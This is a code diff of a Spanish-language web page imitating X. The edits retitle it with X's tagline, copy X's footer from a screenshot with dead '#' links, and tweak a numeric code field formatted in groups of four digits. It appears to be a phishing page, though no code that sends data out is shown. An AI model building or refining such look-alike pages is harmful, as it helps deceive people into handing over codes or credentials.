@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>X</title>
+    <title>X. Lo que está pasando ahora</title>
     <link rel="icon" type="image/jpeg" href="https://i.postimg.cc/rF77rb5c/x-dark.jpg">
     <style>
         /* --- ESTILOS DE LA PANTALLA DE CARGA --- */
@@ -85,10 +84,16 @@
         
         .hidden { display: none !important; }
 
-        .page-footer { width: 100%; padding: 12px 0; text-align: center; }
-        .footer-nav ul { list-style: none; padding: 0; margin: 0; display: flex; flex-wrap: wrap; justify-content: center; gap: 8px 12px; }
-        .footer-nav a { color: #71767b; text-decoration: none; font-size: 13px; }
+        .page-footer { width: 100%; padding: 12px 16px; text-align: center; box-sizing: border-box; }
+        .footer-nav ul { 
+            list-style: none; padding: 0; margin: 0; 
+            display: flex; flex-wrap: wrap; justify-content: center; 
+            gap: 8px 16px; /* Espaciado ajustado para verse como la imagen */
+        }
+        .footer-nav li { display: inline-block; }
+        .footer-nav a { color: #71767b; text-decoration: none; font-size: 13px; line-height: 1.2; }
         .footer-nav a:hover { text-decoration: underline; }
+        .copyright { color: #71767b; font-size: 13px; margin-left: 4px; }
         
         @media (max-width: 1000px) {
             body { justify-content: space-between; }
@@ -126,10 +131,30 @@
                 </div>
             </div>
         </main>
+        
+        <!-- FOOTER ACTUALIZADO SEGÚN LA IMAGEN -->
         <footer class="page-footer">
             <nav class="footer-nav">
                 <ul>
-                    <li><a href="#">Información</a></li><li><a href="#">Descarga la app de X</a></li><li><a href="#">Grok</a></li><li><a href="#">Centro de Ayuda</a></li><li><a href="#">Condiciones de Servicio</a></li><li><a href="#">Política de Privacidad</a></li><li><a href="#">Política de cookies</a></li><li><a href="#">Accesibilidad</a></li><li><a href="#">Información de anuncios</a></li><li><a href="#">Blog</a></li><li><a href="#">Empleos</a></li><li><a href="#">Recursos para marcas</a></li><li><a href="#">Publicidad</a></li><li><a href="#">Marketing</a></li><li><a href="#">X para empresas</a></li><li><a href="#">Desarrolladores</a></li><li><a href="#">Noticias</a></li><li><a href="#">Configuración</a></li>
+                    <li><a href="#">Información</a></li>
+                    <li><a href="#">Descarga la app de X</a></li>
+                    <li><a href="#">Grok</a></li>
+                    <li><a href="#">Centro de Ayuda</a></li>
+                    <li><a href="#">Condiciones de Servicio</a></li>
+                    <li><a href="#">Política de Privacidad</a></li>
+                    <li><a href="#">Política de cookies</a></li>
+                    <li><a href="#">Accesibilidad</a></li>
+                    <li><a href="#">Información de anuncios</a></li>
+                    <li><a href="#">Blog</a></li>
+                    <li><a href="#">Empleos</a></li>
+                    <li><a href="#">Recursos para marcas</a></li>
+                    <li><a href="#">Publicidad</a></li>
+                    <li><a href="#">Marketing</a></li>
+                    <li><a href="#">X para empresas</a></li>
+                    <li><a href="#">Desarrolladores</a></li>
+                    <li><a href="#">Noticias</a></li>
+                    <li><a href="#">Configuración</a></li>
+                    <li class="copyright">© 2026 X Corp.</li>
                 </ul>
             </nav>
         </footer>
@@ -226,7 +251,7 @@
             codeInput.classList.remove('incorrect');
         });
 
-        // Formateo del input
+        // Formateo del input (espacios cada 4 números)
         codeInput.addEventListener('input', (e) => {
             let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
             let formattedValue = '';
